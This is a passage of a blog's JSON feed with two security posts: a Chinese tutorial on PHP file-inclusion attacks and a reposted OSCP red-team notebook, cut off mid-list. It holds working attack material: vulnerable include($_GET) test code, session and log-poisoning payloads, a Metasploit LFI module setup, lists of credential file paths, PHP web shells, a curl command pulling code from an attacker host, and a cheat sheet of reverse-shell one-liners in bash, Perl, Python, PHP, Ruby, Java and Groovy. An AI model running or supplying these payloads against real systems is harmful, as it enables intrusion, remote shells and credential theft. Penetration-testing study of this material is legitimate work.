data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=\"> https://blog.csdn.net/ni9htmar3/article/details/69812306#t8</span></p>\n<h2 id=\"file伪协议读取文件内容\"><a class=\"anchor\" href=\"#file伪协议读取文件内容\">#</a> file:// 伪协议 (读取文件内容)</h2>\n<p>通过 file 协议可以访问本地文件系统，读取到文件的内容</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image025.png\" alt=\"\" /></p>\n<h2 id=\"data伪协议\"><a class=\"anchor\" href=\"#data伪协议\">#</a> data:// 伪协议</h2>\n<p>数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  <code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code></p>\n<p>data://（读取文件）<br />\n和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； <?php // 打印 \"I love PHP\" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>\n<p>注意：&lt;span style=&quot;color: rgb (121, 121, 121);&quot;&gt;&lt;?php phpinfo ();, 这类执行代码最后没有？&gt;&lt;/span &gt; 闭合；</p>\n<p>如果 php.ini 里的 allow_url_include=On（PHP &lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:  <code>http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<h2 id=\"phar伪协议\"><a class=\"anchor\" href=\"#phar伪协议\">#</a> phar:// 伪协议</h2>\n<p>这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br />\n用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。<br />\n注意： PHP &gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br />\n步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"zip伪协议\"><a class=\"anchor\" href=\"#zip伪协议\">#</a> zip:// 伪协议</h2>\n<p>zip 伪协议和 phar 协议类似，但是用法不一样。<br />\n用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。<br />\n条件： PHP &gt; =5.3.0，注意在 windows 下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"封装协议摘要\"><a class=\"anchor\" href=\"#封装协议摘要\">#</a> 封装协议摘要</h2>\n<table>\n    <tr>\n        <th>属性</th>\n        <th>支持</th>\n    </tr>\n    <tr>\n        <td>受限于 allow_url_include</td>\n        <td>仅 <em>php://input</em>、 <em>php://stdin</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>允许读取</td>\n        <td>仅 <em>php://stdin</em>、 <em>php://input</em>、 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许写入</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许追加</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>（等于写入）\n        </td>\n    </tr>\n    <tr>\n        <td>允许同时读写</td>\n        <td>仅 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>支持 stat()</td>\n        <td>仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>仅仅支持 stream_select()</td>\n        <td><em>php://stdin</em>、 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://fd</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n</table>\n<h1 id=\"文件包含姿势\"><a class=\"anchor\" href=\"#文件包含姿势\">#</a> 文件包含姿势</h1>\n<h2 id=\"文件包含session\"><a class=\"anchor\" href=\"#文件包含session\">#</a> 文件包含 session</h2>\n<p><span class=\"label info\">利用条件：</span></p>\n<p>session 的存储位置可以获取。</p>\n<ol>\n<li>通过 phpinfo 的信息可以获取到 session 的存储位置。</li>\n</ol>\n<p>通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>另一种只能猜测了<br />\n根据各版本的中间件猜测。</li>\n</ol>\n<p><span class=\"label info\">session 中的内容可以被控制，传入恶意代码。</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例代码</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$s</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">漏洞分析</span></p>\n<p>此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。</p>\n<p>当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p>session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到 666 已经存里面了</p>\n<p><span class=\"label info\">漏洞利用</span><br />\n通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。</p>\n<p>当访问 http://www.xxx.com/x.php?str=&lt;?php phpinfo ();?&gt; 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p><span class=\"label info\">结果</span></p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"文件包含日志\"><a class=\"anchor\" href=\"#文件包含日志\">#</a> 文件包含日志</h2>\n<p>利用条件：需要知道服务器日志的存储路径，且日志文件可读。</p>\n<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>\n<p><span class=\"label danger\">💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。</span></p>\n<p><span class=\"label info\">示例</span><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p><span class=\"label success\">✔️还可以在 User-Agent 里插入 payload</span></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><span class=\"label danger\">💔有的日志文件里不一定会显示 UA 信息</span><br />\n<span class=\"label info\">示例</span><br />\n<img data-src=\"image017.png\" alt=\"\" /><br />\n这是因为 Apache 配置</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详情见：<a href=\"https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/\">https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/</a></p>\n<h2 id=\"msf-攻击模块\"><a class=\"anchor\" href=\"#msf-攻击模块\">#</a> MSF 攻击模块</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>举个例子</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/unix/webapp/php_include</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">192.168</span>.199.12</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> phpuri /index.php?file<span class=\"token operator\">=</span>xxLFIxx</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> path http://192.168.199.147/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload php/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvport <span class=\"token number\">8888</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit -z</pre></td></tr></table></figure><h1 id=\"常见的敏感信息路径\"><a class=\"anchor\" href=\"#常见的敏感信息路径\">#</a> 常见的敏感信息路径</h1>\n<h2 id=\"windows系统\"><a class=\"anchor\" href=\"#windows系统\">#</a> <span class=\"label info\">Windows 系统</span></h2>\n<p>c:\\boot.ini// 查看系统版本</p>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml// IIS 配置文件</p>\n<p>c:\\windows\\repair\\sam // 存储 Windows 系统初次安装的密码</p>\n<p>c:\\ProgramFiles\\mysql\\my.ini// MySQL 配置</p>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD// MySQL root 密码</p>\n<p>c:\\windows\\php.ini//php 配置信息</p>\n<h2 id=\"linuxunix系统\"><a class=\"anchor\" href=\"#linuxunix系统\">#</a> <span class=\"label info\">Linux/Unix 系统</span></h2>\n<p>/etc/passwd// 账户信息</p>\n<p>/etc/shadow// 账户密码文件</p>\n<p>/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件</p>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</p>\n<p>/usr/local/app/php5/lib/php.ini// PHP 相关配置</p>\n<p>/etc/httpd/conf/httpd.conf// Apache 配置文件</p>\n<p>/etc/my.conf//mysql 配置文件</p>\n<h2 id=\"日志默认路径\"><a class=\"anchor\" href=\"#日志默认路径\">#</a> <span class=\"label info\">日志默认路径</span></h2>\n<p>apache+Linux 日志默认路径</p>\n<p><code>/etc/httpd/logs/access_log</code></p>\n<p>或者</p>\n<p><code>/var/log/httpd/access log</code></p>\n<p>apache+win2003 日志默认路径</p>\n<p><code>D:/xampp/apache/logs/access.log</code></p>\n<p><code>D:/xampp/apache/logs/error.log</code></p>\n<p>IIS6.0+win2003 默认日志文件</p>\n<p><code>C:/WINDOWS/system32/Logfiles</code></p>\n<p>IIS7.0+win2003 默认日志文件</p>\n<p><code>%SystemDrive%/inetpub/logs/LogFiles</code></p>\n<p>nginx 日志文件在用户安装目录的 logs 目录下</p>\n<p>如安装目录为 /usr/local/nginx, 则日志目录就是在</p>\n<p><code>/usr/local/nginx/logs</code></p>\n<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>\n<p><code>/opt/nginx/logs/access.log</code></p>\n<p>web 中间件默认配置</p>\n<p>apache+linux 默认配置文件</p>\n<p><code>/etc/httpd/conf/httpd.conf</code></p>\n<p>或者</p>\n<p><code>index.php?page=/etc/init.d/httpd</code></p>\n<p>IIS6.0+win2003 配置文件</p>\n<p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p>\n<p>IIS7.0+WIN 配置文件</p>\n<p><code>C:/Windows/System32/inetsrv/config/application/Host.config</code></p>\n<h1 id=\"文件包含漏洞的防御\"><a class=\"anchor\" href=\"#文件包含漏洞的防御\">#</a> 文件包含漏洞的防御</h1>\n<ol>\n<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>\n<li>过滤.（点）/（反斜杠）\\（反斜杠）</li>\n<li>禁止服务器远程文件包含</li>\n</ol>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s\">https://www.freebuf.com/articles/web/182280.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=\">https://www.php.cn/toutiao-414790.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=\">https://blog.csdn.net/ni9htmar3/article/details/69812306</span></p>\n",
            "tags": [
                "web安全",
                "文件包含"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/redteam-notebook/",
            "url": "https://self-ferry.github.io/2021/01/18/redteam-notebook/",
            "title": "redteam-notebook【转】",
            "date_published": "2021-01-18T07:58:06.000Z",
            "content_html": "<h1 id=\"redteam-notebook\"><a class=\"anchor\" href=\"#redteam-notebook\">#</a> redteam-notebook</h1>\n<p>Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.</p>\n<h2 id=\"early-enumeration-generic\"><a class=\"anchor\" href=\"#early-enumeration-generic\">#</a> Early Enumeration - generic</h2>\n<h3 id=\"network-wide-scan-first-steps\"><a class=\"anchor\" href=\"#network-wide-scan-first-steps\">#</a> Network wide scan - first steps</h3>\n<p><code>nmap -sn 10.11.1.0/24</code></p>\n<h3 id=\"netbios-scan\"><a class=\"anchor\" href=\"#netbios-scan\">#</a> netbios scan</h3>\n<p><code>nbtscan -r 10.11.1.0/24</code></p>\n<h3 id=\"dns-recon\"><a class=\"anchor\" href=\"#dns-recon\">#</a> DNS recon</h3>\n<p><code>dnsrecon -r 10.11.1.0/24 -n &lt;DNS IP&gt;</code></p>\n<h3 id=\"scan-specific-target-with-nmap\"><a class=\"anchor\" href=\"#scan-specific-target-with-nmap\">#</a> Scan specific target with nmap</h3>\n<p><code>nmap -sV -sT -p- &lt;target IP&gt; </code></p>\n<h3 id=\"guess-os-using-xprobe2\"><a class=\"anchor\" href=\"#guess-os-using-xprobe2\">#</a> Guess OS using xprobe2</h3>\n<p><code>xprobe2 &lt;target IP&gt;</code></p>\n<h3 id=\"check-netbios-vulns\"><a class=\"anchor\" href=\"#check-netbios-vulns\">#</a> Check Netbios vulns</h3>\n<p><code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</code></p>\n<h3 id=\"search-for-smb-vulns\"><a class=\"anchor\" href=\"#search-for-smb-vulns\">#</a> Search for SMB vulns</h3>\n<p><code>nmap -p139,445 &lt;target IP&gt; --script smb-vuln*</code></p>\n<h3 id=\"enumerate-using-smb-null-session\"><a class=\"anchor\" href=\"#enumerate-using-smb-null-session\">#</a> Enumerate using SMB (null session)</h3>\n<p><code>enum4linux -a &lt;target IP&gt;</code></p>\n<h3 id=\"enumerate-using-smb-wuser-pass\"><a class=\"anchor\" href=\"#enumerate-using-smb-wuser-pass\">#</a> Enumerate using SMB (w/user &amp; pass)</h3>\n<p><code>enum4linux -a -u &lt;user&gt; -p &lt;passwd&gt; &lt;targetIP&gt;</code></p>\n<h2 id=\"website-enumeration\"><a class=\"anchor\" href=\"#website-enumeration\">#</a> Website Enumeration</h2>\n<h3 id=\"quick-enumeration-using-wordlist\"><a class=\"anchor\" href=\"#quick-enumeration-using-wordlist\">#</a> quick enumeration using wordlist</h3>\n<p><code>gobuster -u http://&lt;target IP&gt; -w /usr/share/dirb/wordlists/big.txt</code></p>\n<h3 id=\"enumeration-and-basic-vuln-scan-of-a-website\"><a class=\"anchor\" href=\"#enumeration-and-basic-vuln-scan-of-a-website\">#</a> enumeration and basic vuln scan of a website</h3>\n<p><code>nikto -host http://&lt;target IP&gt;</code></p>\n<h2 id=\"website-tips-and-tricks\"><a class=\"anchor\" href=\"#website-tips-and-tricks\">#</a> Website tips and tricks</h2>\n<h3 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h3>\n<ul>\n<li>Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution</li>\n</ul>\n<pre><code>!!python/object/apply:os.system [&quot;bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1&quot;]\n</code></pre>\n<h3 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h3>\n<ul>\n<li>Check for LFI</li>\n</ul>\n<p>Add  <code>/etc/passwd%00</code>  to any GET/POST arguments. On windows try  <code>C:\\Windows\\System32\\drivers\\etc\\hosts%00</code>  or  <code>C:\\autoexec.bat%00</code> .<br />\nA quick win could also be any of these files  <code>c:\\sysprep.inf</code> ,  <code>c:\\sysprep\\sysprep.xml</code>  or  <code>c:\\unattend.xml</code>  as they would contain local admin credentials. On linux it's worth checking  <code>/proc/self/environ</code>  to see if there are any credentials passed to the running process via env vars.</p>\n<ul>\n<li>Fetching .php files via LFI</li>\n</ul>\n<p><code>/index.php?somevar=php://filter/read=convert.base64-encode/resource=&lt;file path&gt;%00</code>  this will return base64 encoded PHP file. Good for fishing up  <code>config.php</code>  or similar.</p>\n<ul>\n<li>\n<p>Abusing /proc/self/environ LFI to gain reverse shell<br />\nIn some situations it's possible to abuse  <code>/proc/self/environ</code>  to execute a command. For example:<br />\n <code>index.php?somevar=/proc/self/environ&amp;cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;your IP&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>Apache access.log + LFI = PHP injection<br />\nIf Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.</p>\n</li>\n</ul>\n<p>with netcat send a request like this:</p>\n<pre><code>GET /&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;\n\n</code></pre>\n<ul>\n<li>\n<p>auth.log + LFI<br />\n <code>ssh &lt;?php system($_GET[&quot;cmd&quot;]);?&gt;@targetIP</code>  and then LFI  <code>/var/log/auth.log</code></p>\n</li>\n<li>\n<p>/var/mail + LFI<br />\n <code>mail -s &quot;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&quot; someuser@targetIP &lt; /dev/null</code></p>\n</li>\n<li>\n<p>php expect<br />\n <code>index.php?somevar=expect://ls</code></p>\n</li>\n<li>\n<p>php input<br />\n <code>curl -X POST &quot;targetIP/index.php?somevar=php://input&quot; --data '&lt;?php system(&quot;curl -o cmd.php yourIP/cmd.txt&quot;);?&gt;'</code> <br />\nThen access  <code>targetIP/cmd.php</code></p>\n</li>\n</ul>\n<h3 id=\"coldfusion\"><a class=\"anchor\" href=\"#coldfusion\">#</a> ColdFusion</h3>\n<ul>\n<li>\n<p>is it Enterprise or Community?<br />\nCheck how it handles  <code>.jsp</code>  files   <code>curl targetIP/blah/blah.jsp</code> . If 404 - enterprise, 500 - community.</p>\n</li>\n<li>\n<p>which version?<br />\n <code>/CFIDE/adminapi/base.cfc?wsdl</code>  has a useful comment indicating exact version</p>\n</li>\n<li>\n<p>common XEE<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHktYXNzZXNzbWVudC5jb20vZmlsZXMvYWR2aXNvcmllcy8yMDEwLTAyLTIyX011bHRpcGxlX0Fkb2JlX1Byb2R1Y3RzLVhNTF9FeHRlcm5hbF9FbnRpdHlfYW5kX1hNTF9JbmplY3Rpb24ucGRm\">https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf</span></p>\n</li>\n<li>\n<p>LFI in admin login locale<br />\n <code>/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\\lib\\password.properties</code>  - may need full path. They can be obtained with help of   <code>/CFIDE/componentutils/cfexplorer.cfc</code></p>\n</li>\n<li>\n<p>Local upload and execution<br />\nOnce access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.</p>\n</li>\n</ul>\n<p><code>Debugging &amp; Logging</code>  -&gt;  <code>Scheduled Tasks</code>  -&gt; url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.</p>\n<p>To execute it create a probe  <code>Debugging &amp; Logging</code>  -&gt;  <code>System probes</code>  -&gt; URL=<some URL>, Probe fail - fail if probe does not contain &quot;blahblah&quot;, Execute program <path to our downloaded exe>. And then run probe manually.</p>\n<ul>\n<li>\n<p>Files worth grabbing</p>\n<ul>\n<li>CF7 \\lib\\neo-query.xml</li>\n<li>CF8 \\lib\\neo-datasource.xml</li>\n<li>CF9 \\lib\\neo-datasource.xml</li>\n</ul>\n</li>\n<li>\n<p>Simple remote CFM shell</p>\n</li>\n</ul>\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;cfexecute name = &quot;#URL.runme#&quot; arguments =\n&quot;#URL.args#&quot; timeout = &quot;20&quot;&gt;\n&lt;/cfexecute&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ul>\n<li>Simple remote shell using Java (if CFEXECUTE is disabled)</li>\n</ul>\n<pre><code>&lt;cfset runtime = createObject(&quot;java&quot;,\n&quot;java.lang.System&quot;)&gt;\n&lt;cfset props = runtime.getProperties()&gt;\n&lt;cfdump var=&quot;#props#&quot;&gt;\n&lt;cfset env = runtime.getenv()&gt;\n&lt;cfdump var=&quot;#env#&quot;&gt;\n</code></pre>\n<h3 id=\"dir-busting\"><a class=\"anchor\" href=\"#dir-busting\">#</a> dir busting</h3>\n<ul>\n<li>\n<p>generic dirbusting<br />\n <code>gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt</code></p>\n</li>\n<li>\n<p>fuzz some cgi<br />\n <code>gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200</code></p>\n</li>\n</ul>\n<h2 id=\"reverse-shell-howto\"><a class=\"anchor\" href=\"#reverse-shell-howto\">#</a> Reverse Shell Howto</h2>\n<ul>\n<li>\n<p>Bash<br />\n <code>bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1</code></p>\n</li>\n<li>\n<p>Perl Linux<br />\n <code>perl -e 'use Socket;$i=&quot;yourIP&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;'</code></p>\n</li>\n<li>\n<p>Perl Windows<br />\n <code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;yourIP:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></p>\n</li>\n<li>\n<p>Python<br />\n <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;yourIP&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>PHP<br />\n <code>php -r '$sock=fsockopen(&quot;yourIP&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>\n</li>\n<li>\n<p>Ruby<br />\n <code>ruby -rsocket -e'f=TCPSocket.open(&quot;yourIP&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></p>\n</li>\n<li>\n<p>Java (Linux)</p>\n</li>\n</ul>\n<pre><code>r = Runtime.getRuntime()\np = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/yourIP/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])\np.waitFor()\n</code></pre>\n<ul>\n<li>Groovy</li>\n</ul>\n<pre><code>String host=&quot;localhost&quot;;\nint port=8044;\nString cmd=&quot;cmd.exe&quot;;\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());\nwhile(pe.available()&gt;0)so.write(pe.read());\nwhile(si.available()&gt;0)po.write(si.read());\nso.flush();po.flush();\nThread.sleep(50);\ntry &#123;p.exitValue();\nbreak;\n&#125;catch (Exception e)&#123;&#125;&#125;;\np.destroy();\ns.close();\n\n</code></pre>\n<ul>\n<li>xterm</li>\n</ul>\n<p><code>xterm -display yourIP:1</code></p>\n<p>And on your side authorize the connection with  <code>xhost +targetIp</code>  and catch it 